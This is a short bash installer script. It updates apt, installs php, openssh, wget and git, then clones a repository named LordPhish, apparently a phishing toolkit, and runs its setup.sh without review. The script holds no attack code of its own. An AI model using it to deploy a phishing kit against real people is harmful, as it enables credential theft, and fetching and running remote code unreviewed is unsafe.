# shellcheck disable=SC2034
# shellcheck disable=SC2155

export  green="$(tput setaf 2)"
export blue="$(tput setaf 6)"


echo "${blue} [!] Downloading and installing LordPhish "
apt-get update -y
apt-get install php -y
apt-get install openssh -y 
apt-get install wget -y
apt-get install git -y
git clone https://github.com/Black-Hell-Team/LordPhish.git
cd LordPhish
bash setup.sh 
echo "${green} Done ! [To run LordPhish execute : bash lord.sh]"
